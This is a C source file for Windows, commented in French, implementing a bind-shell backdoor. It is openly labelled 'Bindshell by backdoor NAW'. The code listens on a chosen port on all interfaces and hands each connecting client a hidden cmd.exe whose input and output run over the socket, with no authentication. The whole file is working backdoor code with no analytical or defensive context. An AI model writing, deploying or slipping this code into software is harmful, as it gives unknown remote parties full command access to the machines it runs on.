#include "stdio.h"
#include "winsock2.h"

int BS(char *buf)
{
    int port = atoi(buf);
    // Initialise Winsock
    printf("Version 4\n");
    printf("Initialise Winsock\n");
    WSADATA wd;
    WSAStartup(MAKEWORD(1, 1), &wd);
    // Crée le socket
    printf("Crée le socket\n");
    int sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    // Regle le sockaddr
    struct sockaddr_in sin;
    struct sockaddr_in cli;
    memset(&sin, 0, sizeof(sin));
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);
    sin.sin_addr.s_addr = htonl(INADDR_ANY);
    bind(sock, (struct sockaddr *)&sin, sizeof(struct sockaddr)); // Point de communication -
    printf("Attend sur le port %d", port);
    listen(sock, 0x5);
    while (1)
    {
        int client = accept(sock, NULL, NULL); // On accepte un client éventuel -
        send(client, "****Bindshell by backdoor NAW****\r\n", strlen("****Bindshell by backdoor NAW****\r\n"), 0);
        // Envoie le shell
        printf("Envoie le shell sur le socket\n");
        PROCESS_INFORMATION pi;
        STARTUPINFO si;
        memset(&si, 0, sizeof(si));
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
        si.wShowWindow = SW_HIDE;
        si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)client;
        int verdict = CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, TEXT("c:\\"), &si, &pi);
        if (verdict)
            printf("Ok\n");
        else
            printf("Erreur\n");
    }
}
